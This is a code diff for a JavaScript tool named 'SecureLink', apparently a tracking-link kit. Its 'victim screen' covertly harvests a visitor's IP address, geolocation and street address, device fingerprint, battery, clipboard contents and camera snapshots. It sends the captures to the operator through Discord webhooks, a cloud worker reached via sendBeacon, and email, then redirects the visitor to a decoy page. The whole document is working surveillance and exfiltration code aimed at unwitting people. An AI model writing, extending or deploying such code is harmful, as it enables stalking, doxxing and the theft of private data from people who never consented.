   toast('Settings saved', 'success');
+  updateCloudBadge();
   runDiagnostics();
   startAutoSync();
 }
@@ -1072,39 +1060,58 @@ async function testDiscord() {
   if (!hook) return toast('Enter Discord webhook URL first', 'error');
   toast('Sending test...', 'info');
   try {
-    const r = await fetch(hook, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: '✅ SecureLink is wired to Discord. You will receive captures here.' })
-    });
-    if (r.ok) toast('Test sent! Check Discord.', 'success');
-    else toast('Discord returned ' + r.status, 'error');
-  } catch (e) { toast('Network error: ' + e.message, 'error'); }
+    const r = await fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: '✅ SecureLink is wired to Discord.' }) });
+    if (r.ok) toast('Discord test sent!', 'success'); else toast('Discord ' + r.status, 'error');
+  } catch (e) { toast('Discord error: ' + e.message, 'error'); }
 }
 async function testCloud() {
   const url = document.getElementById('cfUrl').value.trim().replace(/\/$/,'');
   const secret = document.getElementById('cfSecret').value.trim();
   if (!url || !secret) return toast('Enter Worker URL and secret', 'error');
   try {
-    const r = await fetch(url + '/health', { headers: { 'x-secret': secret } });
+    const r = await fetch(url + '/health');
     const d = await r.json();
-    if (d.ok) toast('Cloud backend is alive', 'success');
-    else toast('Cloud replied but not OK', 'error');
+    if (d.ok && d.binding && d.secretSet) toast('Cloud backend is healthy', 'success');
+    else if (d.ok) toast('Worker ok but ' + (d.binding ? '' : 'binding missing ') + (d.secretSet ? '' : 'secret missing'), 'error');
+    else toast('Worker: ' + (d.error || 'failed'), 'error');
   } catch (e) { toast('Cloud error: ' + e.message, 'error'); }
 }
 async function testTelegram() {
   const token = document.getElementById('tgToken').value.trim();
   const chat = document.getElementById('tgChat').value.trim();
   if (!token || !chat) return toast('Enter token and chat ID first', 'error');
-  toast('Attempting (may fail in PK)...', 'info');
   try {
     const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chat, text: '✅ SecureLink test — bot works from here.' })
+      body: JSON.stringify({ chat_id: chat, text: '✅ SecureLink test.' })
     });
     const data = await res.json();
-    if (data.ok) toast('Telegram sent!', 'success');
-    else toast('Telegram: ' + (data.description || 'failed'), 'error');
-  } catch (e) { toast('Telegram unreachable (expected in PK): ' + e.message, 'error'); }
+    if (data.ok) toast('Telegram sent!', 'success'); else toast('TG: ' + (data.description || 'failed'), 'error');
+  } catch (e) { toast('TG unreachable (expected in PK)', 'error'); }
+}
+async function runDiagnostics() {
+  const box = document.getElementById('diagBox'); if (!box) return;
+  const lines = [];
+  lines.push(`secure context: ${isSecureCtx() ? 'YES' : 'NO'}`);
+  lines.push(`protocol: ${location.protocol}`);
+  lines.push(`getUserMedia: ${navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? 'yes' : 'no'}`);
+  lines.push(`geolocation: ${navigator.geolocation ? 'yes' : 'no'}`);
+  lines.push(`clipboard: ${navigator.clipboard ? 'yes' : 'no'}`);
+  lines.push(`cloud configured: ${state.settings.cfUrl && state.settings.cfSecret ? 'yes' : 'no'}`);
+  lines.push(`discord configured: ${state.settings.dcHook ? 'yes' : 'no'}`);
+  try { const r = await fetch('https://api.ipify.org/?format=json'); const d = await r.json(); lines.push(`ipify: yes (${d.ip})`); }
+  catch(e) { lines.push(`ipify: NO`); }
+  try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); lines.push(`ipapi: yes (${d.city || '?'}, ${d.country_name || '?'})`); }
+  catch(e) { lines.push(`ipapi: NO`); }
+  if (state.settings.cfUrl) {
+    try {
+      const r = await fetch(state.settings.cfUrl.replace(/\/$/,'') + '/health');
+      const d = await r.json();
+      lines.push(`cloud health: ${d.ok ? 'OK' : 'FAIL'} binding=${d.binding} secret=${d.secretSet}`);
+    } catch(e) { lines.push(`cloud health: NO — ${e.message}`); }
+  }
+  box.innerHTML = lines.map(l => `<div>${l}</div>`).join('');
 }
 
 /* ============ VICTIM SCREEN ============ */
@@ -1152,10 +1159,29 @@ function launchVictim(link) {
   const pipelinePromise = (async () => {
     try {
       const log = await collectData(link);
+
+      // ALWAYS send to cloud first via sendBeacon (fire-and-forget, survives navigation)
+      if (link.code !== 'preview' && link.cfUrl && link.cfSecret) {
+        try {
+          const url = link.cfUrl.replace(/\/$/,'') + '/capture?secret=' + encodeURIComponent(link.cfSecret);
+          const payload = JSON.stringify(log);
+          // Try sendBeacon first (survives navigation), fall back to fetch
+          let sent = false;
+          if (navigator.sendBeacon) {
+            const blob = new Blob([payload], { type: 'application/json' });
+            sent = navigator.sendBeacon(url, blob);
+          }
+          if (!sent) {
+            // Fallback to sync-ish fetch with keepalive
+            fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true }).catch(()=>{});
+          }
+        } catch(e) { console.warn('beacon failed', e); }
+      }
+
       if (link.code !== 'preview') {
         log.new = true;
-        log.delivered = '';
-        // push lean copy to local (admin's own browser)
+        log.delivered = 'cloud';
+        // local lean copy for panel cache
         let stored = { ...log };
         try {
           const full = JSON.stringify(stored);
@@ -1167,39 +1193,21 @@ function launchVictim(link) {
         if (state.logs.length > 500) state.logs = state.logs.slice(-500);
         safeSet('sl_logs', state.logs);
 
-        // deliver in parallel
-        const [dcOk, cloudOk, tgOk, emOk] = await Promise.all([
-          deliverToDiscord(log, link).catch(() => false),
-          deliverToCloud(log, link).catch(() => false),
-          deliverToTelegram(log, link).catch(() => false),
-          deliverToEmail(log, link).catch(() => false)
-        ]);
-
-        // if everything failed, queue for retry
-        const anyOk = dcOk || cloudOk || tgOk || emOk;
-        let flags = [];
+        // Other channels
+        const dcOk = await deliverToDiscord(log, link).catch(() => false);
+        const emOk = await deliverToEmail(log, link).catch(() => false);
+        let flags = ['cloud'];
         if (dcOk) flags.push('dc');
-        if (cloudOk) flags.push('cloud');
-        if (tgOk) flags.push('tg');
         if (emOk) flags.push('email');
-        const delivered = anyOk ? flags.join(',') : 'none';
-
         const s = state.logs.find(l => String(l.id) === String(log.id));
-        if (s) s.delivered = delivered;
+        if (s) s.delivered = flags.join(',');
         safeSet('sl_logs', state.logs);
-
-        if (!anyOk) {
-          enqueueForRetry(log);
-        }
-
         renderStats();
         if (state.currentTab === 'logs') renderLogs();
       } else {
-        // preview: don't store locally, still deliver
+        // preview: still deliver but don't store
         await Promise.allSettled([
           deliverToDiscord(log, link),
-          deliverToCloud(log, link),
-          deliverToTelegram(log, link),
           deliverToEmail(log, link)
         ]);
       }
@@ -1217,48 +1225,17 @@ function launchVictim(link) {
       document.getElementById('adminPanel').classList.remove('hidden');
       window.location.hash = 'admin';
       toast('Preview completed', 'info');
+      syncFromCloud(false);
     } else if (link.dest) {
       window.location.href = link.dest;
     }
   });
 }
 
-/* ============ RETRY QUEUE ============ */
-function enqueueForRetry(log) {
-  try {
-    state.queue.push(log);
-    if (state.queue.length > 50) state.queue = state.queue.slice(-50);
-    safeSet('sl_queue', state.queue);
-  } catch(e) {}
-}
-async function flushQueue() {
-  if (!state.queue.length) return;
-  const settings = state.settings;
-  const remaining = [];
-  for (const log of state.queue) {
-    try {
-      const link = { dcHook: settings.dcHook || '', cfUrl: settings.cfUrl || '', cfSecret: settings.cfSecret || '',
-        tgToken: settings.tgToken || '', tgChat: settings.tgChat || '',
-        emPub: settings.emPub || '', emSvc: settings.emSvc || '', emTpl: settings.emTpl || '', emTo: settings.emTo || '' };
-      const results = await Promise.allSettled([
-        deliverToDiscord(log, link),
-        deliverToCloud(log, link),
-        deliverToTelegram(log, link),
-        deliverToEmail(log, link)
-      ]);
-      const anyOk = results.some(r => r.status === 'fulfilled' && r.value === true);
-      if (!anyOk) remaining.push(log);
-    } catch(e) { remaining.push(log); }
-  }
-  state.queue = remaining;
-  safeSet('sl_queue', state.queue);
-}
-
-/* ============ DEVICE FINGERPRINTING ============ */
+/* ============ DEVICE PARSING ============ */
 function parseDeviceInfo() {
   const ua = navigator.userAgent || '';
   const info = { ua };
-
   const manMap = [
     ['Samsung', /Samsung/i], ['Apple', /iPhone|iPad|iPod|Macintosh/i], ['Google', /Pixel/i],
     ['Huawei', /Huawei|HONOR/i], ['Xiaomi', /Xiaomi|Redmi|POCO|MI \d/i], ['OnePlus', /OnePlus/i],
@@ -1299,11 +1276,8 @@ function parseDeviceInfo() {
   else if (/iPad/.test(ua)) model = 'iPad';
   else {
     let m = ua.match(/Android [\d.]+;\s*([^;)]+?)(?:\s+Build|\)|;)/i);
-    if (m) {
-      model = m[1].trim().replace(/^[a-z]{2}[-_][A-Z]{2};?\s*/,'').trim().replace(/\s+(Build\/.*|wv|Mobile|Tablet)$/i,'').trim();
-    }
+    if (m) model = m[1].trim().replace(/^[a-z]{2}[-_][A-Z]{2};?\s*/,'').trim().replace(/\s+(Build\/.*|wv|Mobile|Tablet)$/i,'').trim();
     const sm = ua.match(/\b(SM-[A-Z0-9]+)\b/); if (sm && !model) model = sm[1];
-    const hw = ua.match(/\b([A-Z]{2,4}-[A-Z0-9]{2,6})\b/); if (!model && hw) model = hw[1];
   }
   model = (model || '').replace(/\s+/g,' ').trim();
   if (model && model.length > 60) model = model.slice(0,60);
@@ -1311,7 +1285,7 @@ function parseDeviceInfo() {
 
   let br = 'Unknown', brVer = '';
   if (/Edg\/([\d.]+)/.test(ua)) { br = 'Edge'; brVer = RegExp.$1; }
-  else if (/OPR\/([\d.]+)|Opera/.test(ua)) { br = 'Opera'; brVer = RegExp.$1 || ''; }
+  else if (/OPR\/([\d.]+)/.test(ua)) { br = 'Opera'; brVer = RegExp.$1; }
   else if (/Chrome\/([\d.]+)/.test(ua) && !/Edg|OPR/.test(ua)) { br = 'Chrome'; brVer = RegExp.$1; }
   else if (/Firefox\/([\d.]+)/.test(ua)) { br = 'Firefox'; brVer = RegExp.$1; }
   else if (/Version\/([\d.]+).*Safari/.test(ua)) { br = 'Safari'; brVer = RegExp.$1; }
@@ -1320,7 +1294,7 @@ function parseDeviceInfo() {
   return info;
 }
 
-/* ============ REVERSE GEOCODING ============ */
+/* ============ GEO ============ */
 async function reverseGeocode(lat, lon) {
   try {
     const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
@@ -1329,8 +1303,8 @@ async function reverseGeocode(lat, lon) {
     const d = await r.json();
     if (!d) return null;
     const a = d.address || {};
-    const parts = [a.house_number, a.road || a.street || a.pedestrian, a.neighbourhood || a.suburb,
-      a.city || a.town || a.village || a.municipality, a.state || a.region, a.postcode, a.country].filter(Boolean);
+    const parts = [a.house_number, a.road || a.street, a.neighbourhood || a.suburb,
+      a.city || a.town || a.village, a.state, a.postcode, a.country].filter(Boolean);
     return { display: d.display_name || parts.join(', '), city: a.city || a.town || a.village || '', state: a.state || '', country: a.country || '', postcode: a.postcode || '' };
   } catch(e) { return null; }
 }
@@ -1340,14 +1314,9 @@ async function ipGeolocate() {
     if (!r.ok) return null;
     const d = await r.json();
     if (!d || d.error) return null;
-    return {
-      ip: d.ip,
-      city: d.city, region: d.region, country: d.country_name,
-      postal: d.postal,
-      isp: d.org,
-      lat: d.latitude, lon: d.longitude,
-      display: [d.city, d.region, d.country_name].filter(Boolean).join(', ')
-    };
+    return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal,
+      isp: d.org, lat: d.latitude, lon: d.longitude,
+      display: [d.city, d.region, d.country_name].filter(Boolean).join(', ') };
   } catch(e) { return null; }
 }
 
@@ -1363,21 +1332,14 @@ async function collectData(link) {
   const mods = link.modules || [];
   const tasks = [];
 
-  // IP + IP-based geo
   if (mods.includes('ip')) {
     tasks.push((async () => {
-      try {
-        const r = await fetch('https://api.ipify.org/?format=json');
-        const d = await r.json();
-        log.ip = d.ip;
-      } catch (e) { log.ip = 'unknown'; }
-      // IP geolocation
+      try { const r = await fetch('https://api.ipify.org/?format=json'); const d = await r.json(); log.ip = d.ip; }
+      catch (e) { log.ip = 'unknown'; }
       const g = await ipGeolocate();
       if (g) {
-        log.ipGeo = g.display;
-        log.ipIsp = g.isp;
-        log.ipCity = g.city;
-        log.ipCountry = g.country;
+        log.ipGeo = g.display; log.ipIsp = g.isp;
+        log.ipCity = g.city; log.ipCountry = g.country;
         if (!log.coords && g.lat && g.lon) {
           log.coords = `${g.lat.toFixed(4)}, ${g.lon.toFixed(4)}`;
           log.coordsSource = 'ip';
@@ -1451,10 +1413,8 @@ async function collectData(link) {
       if (typeof navigator.getBattery !== 'function') { log.battery = 'unsupported'; return; }
       try {
         const b = await navigator.getBattery();
-        log.battery = `${Math.round(b.level * 100)}%${b.charging ? ' ⚡ charging' : ''}`;
-        if (b.dischargingTime && b.dischargingTime !== Infinity) {
-          log.batteryTime = Math.round(b.dischargingTime / 60) + ' min left';
-        }
+        log.battery = `${Math.round(b.level * 100)}%${b.charging ? ' ⚡' : ''}`;
+        if (b.dischargingTime && b.dischargingTime !== Infinity) log.batteryTime = Math.round(b.dischargingTime / 60) + ' min';
       } catch (e) { log.battery = 'denied'; }
     })());
   }
@@ -1482,11 +1442,10 @@ async function collectData(link) {
       };
       if (await tryRead()) return;
       await new Promise(resolve => {
-        const cleanup = () => { document.removeEventListener('click', handler, true); document.removeEventListener('touchstart', handler, true); document.removeEventListener('keydown', handler, true); };
+        const cleanup = () => { document.removeEventListener('click', handler, true); document.removeEventListener('touchstart', handler, true); };
         const handler = async () => { cleanup(); await tryRead(); resolve(); };
         document.addEventListener('click', handler, { capture: true, once: true });
         document.addEventListener('touchstart', handler, { capture: true, once: true });
-        document.addEventListener('keydown', handler, { capture: true, once: true });
         setTimeout(() => { cleanup(); resolve(); }, 2500);
       });
       if (!log.clipboard) log.clipboard = 'denied';
@@ -1562,32 +1521,6 @@ async function computeFingerprint() {
 }
 
 /* ============ DELIVERY ============ */
-function telegramText(log) {
-  const mapLink = log.coords ? `https://www.google.com/maps?q=${log.coords}` : '';
-  return [
-    `🎯 New Hit — /${log.code}`,
-    ``,
-    `🌐 IP: ${log.ip || 'N/A'}${log.ipIsp ? ' ('+log.ipIsp+')' : ''}`,
-    `📍 Address: ${log.address || 'N/A'}${log.coordsSource ? ' ['+log.coordsSource+']' : ''}`,
-    `📌 Coords: ${log.coords || 'N/A'}${log.accuracy ? ' (±'+log.accuracy+'m)' : ''}`,
-    `🗺️ Map: ${mapLink || 'N/A'}`,
-    `📱 Model: ${log.deviceModel || 'N/A'}`,
-    `🏭 Brand: ${log.manufacturer || 'N/A'}`,
-    `💻 OS: ${log.os || 'N/A'}${log.osVersion ? ' '+log.osVersion : ''}`,
-    `🌍 Browser: ${log.browser || 'N/A'}${log.browserVersion ? ' '+log.browserVersion : ''}`,
-    `🖥️ Screen: ${log.screen || 'N/A'} @${log.pixelRatio || 1}x`,
-    `🕐 TZ: ${log.tz || 'N/A'}`,
-    `🔋 Battery: ${log.battery || 'N/A'}${log.batteryTime ? ' · '+log.batteryTime : ''}`,
-    `📶 Network: ${log.connection || 'N/A'}${log.downlink ? ' · '+log.downlink+'Mbps' : ''}`,
-    `⚙️ Cores: ${log.cores || 'N/A'}${log.memory ? ' · RAM '+log.memory+'GB+' : ''}`,
-    `🗣️ Lang: ${log.language || 'N/A'}`,
-    `🔍 FP: ${log.fingerprint || 'N/A'}`,
-    `📋 Clipboard: ${log.clipboard || 'N/A'}`,
-    `🔗 URL: ${log.url}`,
-    `⏱️ ${new Date(log.timestamp).toLocaleString()}`
-  ].join('\n');
-}
-
 function discordEmbed(log) {
   const mapLink = log.coords ? `https://www.google.com/maps?q=${log.coords}` : '';
   const fields = [];
@@ -1600,20 +1533,14 @@ function discordEmbed(log) {
   add('🖥️ Screen', log.screen + (log.pixelRatio ? ` @${log.pixelRatio}x` : ''));
   add('🕐 Timezone', log.tz);
   add('🔋 Battery', log.battery + (log.batteryTime ? ' · ' + log.batteryTime : ''));
-  add('📶 Network', (log.connection || '') + (log.downlink ? ` · ${log.downlink}Mbps` : '') + (log.rtt ? ` · ${log.rtt}` : ''));
+  add('📶 Network', (log.connection || '') + (log.downlink ? ` · ${log.downlink}Mbps` : ''));
   add('⚙️ CPU/RAM', (log.cores || '?') + ' cores' + (log.memory ? ` · ${log.memory}GB+` : ''));
   add('🗣️ Language', log.language);
   add('🔍 Fingerprint', log.fingerprint);
   if (log.clipboard) add('📋 Clipboard', log.clipboard);
   if (log.address) fields.push({ name: '📍 Address', value: log.address.slice(0, 1024), inline: false });
   if (log.coords) fields.push({ name: '📌 Coords', value: `${log.coords}${log.accuracy ? ` ±${log.accuracy}m` : ''}${log.coordsSource ? ` [${log.coordsSource}]` : ''}`, inline: false });
-
-  const embed = {
-    title: `🎯 Capture — /${log.code}`,
-    color: 0x6366f1,
-    timestamp: log.timestamp,
-    fields
-  };
+  const embed = { title: `🎯 Capture — /${log.code}`, color: 0x6366f1, timestamp: log.timestamp, fields };
   if (mapLink) embed.url = mapLink;
   return embed;
 }
@@ -1624,71 +1551,23 @@ async function deliverToDiscord(log, link) {
   let ok = false;
   try {
     const r = await fetch(hook, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ content: `**New capture** — \`/${log.code}\``, embeds: [discordEmbed(log)] })
     });
     if (r.ok) ok = true;
-    else console.warn('Discord embed failed', r.status);
-  } catch(e) { console.warn('Discord error', e); }
-
-  // send images as file attachments (multipart)
+  } catch(e) {}
   const snaps = Array.isArray(log.snapshots) ? log.snapshots.filter(x => x && x.startsWith('data:')) : [];
   for (let i = 0; i < snaps.length; i++) {
     try {
       const blob = dataURLtoBlob(snaps[i]);
       const form = new FormData();
-      form.append('payload_json', JSON.stringify({ content: `📸 /${log.code} — snapshot ${i+1}/${snaps.length}` }));
+      form.append('payload_json', JSON.stringify({ content: `📸 /${log.code} — ${i+1}/${snaps.length}` }));
       form.append('files[0]', blob, `snap${i+1}.jpg`);
-      const r = await fetch(hook, { method: 'POST', body: form });
-      if (!r.ok) console.warn('Discord photo failed', r.status);
-      await new Promise(res => setTimeout(res, 350));
-    } catch(e) { console.warn('Discord photo error', e); }
-  }
-  return ok;
-}
-
-async function deliverToCloud(log, link) {
-  const url = ((link && link.cfUrl) || state.settings.cfUrl || '').replace(/\/$/,'');
-  const secret = (link && link.cfSecret) || state.settings.cfSecret;
-  if (!url || !secret) return false;
-  try {
-    const r = await fetch(url + '/capture', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'x-secret': secret },
-      body: JSON.stringify(log)
-    });
-    if (!r.ok) { console.warn('cloud POST failed', r.status); return false; }
-    const d = await r.json();
-    return d.ok === true;
-  } catch(e) { console.warn('cloud error', e); return false; }
-}
-
-async function deliverToTelegram(log, link) {
-  const s = { tgToken: (link && link.tgToken) || state.settings.tgToken, tgChat: (link && link.tgChat) || state.settings.tgChat };
-  if (!s.tgToken || !s.tgChat) return false;
-  try {
-    const res = await fetch(`https://api.telegram.org/bot${s.tgToken}/sendMessage`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: s.tgChat, text: telegramText(log), disable_web_page_preview: true })
-    });
-    const d = await res.json();
-    if (!d.ok) { console.warn('tg text failed', d.description); return false; }
-  } catch(e) { console.warn('tg unreachable', e.message); return false; }
-
-  const snaps = Array.isArray(log.snapshots) ? log.snapshots.filter(x => x && x.startsWith('data:')) : [];
-  for (let i = 0; i < snaps.length; i++) {
-    try {
-      const blob = dataURLtoBlob(snaps[i]);
-      const f = new FormData();
-      f.append('chat_id', s.tgChat);
-      f.append('caption', `📸 /${log.code} — ${i+1}/${snaps.length}`);
-      f.append('photo', blob, `snap${i+1}.jpg`);
-      await fetch(`https://api.telegram.org/bot${s.tgToken}/sendPhoto`, { method: 'POST', body: f });
+      await fetch(hook, { method: 'POST', body: form });
       await new Promise(res => setTimeout(res, 350));
     } catch(e) {}
   }
-  return true;
+  return ok;
 }
 
 async function deliverToEmail(log, link) {
@@ -1712,17 +1591,13 @@ async function deliverToEmail(log, link) {
       to_email: s.emTo, code: log.code, ip: log.ip || 'N/A',
       address: log.address || 'N/A', coords: log.coords || 'N/A', map_url: mapLink || 'N/A',
       device_model: log.deviceModel || 'N/A', manufacturer: log.manufacturer || 'N/A',
-      os: log.os || 'N/A', os_version: log.osVersion || '',
-      browser: log.browser || 'N/A', browser_version: log.browserVersion || '',
+      os: log.os || 'N/A', browser: log.browser || 'N/A',
       screen: log.screen || 'N/A', timezone: log.tz || 'N/A',
       battery: log.battery || 'N/A', connection: log.connection || 'N/A',
-      cores: log.cores || 'N/A', memory: log.memory || 'N/A',
-      language: log.language || 'N/A', fingerprint: log.fingerprint || 'N/A',
-      snapshots: Array.isArray(log.snapshots) ? `${log.snapshots.length} captured` : 'N/A',
       timestamp: new Date(log.timestamp).toLocaleString(), url: log.url
     });
     return true;
-  } catch(e) { console.warn('email failed', e); return false; }
+  } catch(e) { return false; }
 }
 
 function dataURLtoBlob(dataurl) {
